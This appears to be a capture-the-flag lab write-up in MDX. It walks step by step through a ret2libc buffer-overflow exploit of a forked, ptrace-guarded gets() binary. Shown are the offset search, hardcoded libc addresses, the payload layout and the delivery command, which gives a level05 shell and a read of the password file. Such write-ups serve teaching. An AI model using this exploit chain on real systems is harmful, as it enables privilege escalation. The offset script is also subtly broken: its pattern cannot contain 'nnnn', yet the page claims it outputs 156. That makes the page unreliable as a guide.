---
sidebar_position: 6
---

import AsciinemaPlayer from '@site/src/components/AsciinemaPlayer';
import MissionObjective from '@site/src/components/MissionObjective';
import VulnerabilityCard from '@site/src/components/VulnerabilityCard';
import CodeBlock from '@site/src/components/CodeBlock';
import StepsList from '@site/src/components/StepsList';

# 🧼 Level 04

<MissionObjective 
  level="Level 04"
  target="level05 privileges"
  method="ret2libc buffer overflow with anti-debugging bypass"
/>

## Vulnerability Analysis

<VulnerabilityCard 
  type="Stack-based Buffer Overflow with Protection Bypass"
  severity="high"
  description="Classic buffer overflow in gets() function within a forked child process. The parent uses ptrace() to prevent exec() calls, requiring ret2libc technique instead of shellcode injection."
  techniques={[
    "Buffer Overflow",
    "ret2libc Attack", 
    "Fork Analysis",
    "Anti-Debug Bypass"
  ]}
/>

## Binary Behavior Analysis

<CodeBlock 
  title="Program Architecture"
  command="# Binary execution flow"
  output={`1. Program forks into parent and child processes
2. Parent: Uses ptrace() to monitor child and prevent exec()
3. Child: Reads input using gets() - VULNERABLE TO OVERFLOW
4. Anti-shellcode: Any execve attempt is detected and blocked`}
/>

**Key Security Features:**
- **Fork-based isolation**: Child process handles user input
- **Ptrace monitoring**: Parent prevents direct shellcode execution
- **Gets() vulnerability**: No bounds checking on input buffer

## Strategy: ret2libc Attack

<CodeBlock 
  title="Attack Methodology"
  command="# Why ret2libc instead of shellcode"
  output={`Traditional shellcode with execve() → BLOCKED by ptrace()
ret2libc technique → Reuses existing libc functions
Goal: system("/bin/sh") + exit() + proper arguments`}
/>



## Live Demonstration

<AsciinemaPlayer 
  src="https://asciinema.org/a/bEHYk4fnHUb3qqFHwEDwbYKkD.js" 
  id="asciicast-bEHYk4fnHUb3qqFHwEDwbYKkD" 
/>

## Step 1: Finding EIP Offset

<CodeBlock 
  title="GDB Setup for Fork Analysis"
  command="gdb ./level04"
  output={`(gdb) set follow-fork-mode child
(gdb) run`}
/>



<StepsList
  title="Buffer Overflow Analysis"
  steps={[
    {
      title: "Generate Pattern",
      description: "Create a unique pattern to identify exact overflow offset",
      command: "# Input long pattern string",
      result: "AAAABBBBCCCCDDDD...nnnn..."
    },
    {
      title: "Crash Analysis",
      description: "Identify which part of pattern overwrites EIP",
      command: "EIP = 0x6e6e6e6e ('nnnn')",
      result: "Pattern offset calculation needed"
    },
    {
      title: "Calculate Offset",
      description: "Find exact position where EIP gets overwritten",
      command: "pattern.find('nnnn')",
      result: "Offset = 156 bytes"
    }
  ]}
/>

## Step 2: Gathering libc Addresses

<CodeBlock 
  title="Dynamic Address Resolution"
  command="(gdb) info functions"
  output={`(gdb) info functions system
system@plt = 0xf7e6aed0

(gdb) info functions exit  
exit@plt = 0xf7e5eb70

(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec`}
/>

**Critical Addresses:**
- `system()`: `0xf7e6aed0`
- `exit()`: `0xf7e5eb70` 
- `"/bin/sh"`: `0xf7f897ec`

## Step 3: Payload Construction

<CodeBlock 
  title="ret2libc Payload Structure"
  command="# Payload layout"
  output={`[Padding: 156 bytes] + [system addr] + [exit addr] + ["/bin/sh" addr]
[    Buffer fill    ] + [  EIP->sys  ] + [return addr] + [ argument  ]`}
/>

<CodeBlock 
  title="Payload Generation"
  command='python -c "print A*156 + system_addr + exit_addr + binsh_addr"'
  output={`Payload breakdown:
- "A"*156: Fill buffer until EIP
- system_addr: system() address (little-endian)
- exit_addr: exit() return address  
- binsh_addr: "/bin/sh" argument`}
/>

## Step 4: Exploitation

<CodeBlock 
  title="Payload Delivery"
  command="cat /tmp/payload - | ./level04"
  output={`$ whoami
level05
$ cat /home/users/level05/.pass
[SUCCESS - Next level password revealed]`}
/>

## Technical Deep Dive

### Fork Protection Analysis

<CodeBlock 
  title="Process Architecture"
  command="# Understanding the protection mechanism"
  output={`Parent Process:
- Monitors child with ptrace()
- Blocks any exec() system calls
- Waits for child completion

Child Process:  
- Handles user input via gets()
- Vulnerable to buffer overflow
- Cannot execute new binaries (exec blocked)`}
/>

### ret2libc vs Shellcode

:::tip **Why ret2libc Works**
- **No New Process**: Reuses existing process memory
- **Library Functions**: Uses already-loaded libc functions
- **Ptrace Evasion**: No exec() calls to trigger protection
- **Clean Execution**: Proper function calling convention
:::

## Offset Calculation Script

<CodeBlock 
  title="Pattern Generation Tool"
  command="python"
  output={`pattern = "".join([
    f"{a}{b}{c}{d}"
    for a in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" 
    for b in "abcdefghijklmnopqrstuvwxyz"
    for c in "0123456789"
    for d in "0123456789"
])

print(pattern.find("nnnn"))  # Output: 156`}
/>

## Key Learning Points

:::warning **Anti-Debug Considerations**
- **Fork Complexity**: Must follow child process in debugger
- **Dynamic Addresses**: ASLR requires runtime address resolution
- **Payload Delivery**: Interactive input needed (cat - technique)
- **Protection Bypass**: Understanding why ret2libc works when shellcode fails
:::

## Technical Summary

This level demonstrates:
1. **Advanced Buffer Overflow** - Beyond simple shellcode injection
2. **Process Architecture Analysis** - Understanding fork/ptrace protection
3. **ret2libc Technique** - Function reuse instead of code injection  
4. **Dynamic Analysis** - Runtime address resolution and debugging
5. **Protection Bypass** - Working around modern security measures

The vulnerability showcases how even protected binaries can be exploited through creative techniques that work within the constraints of the security mechanisms.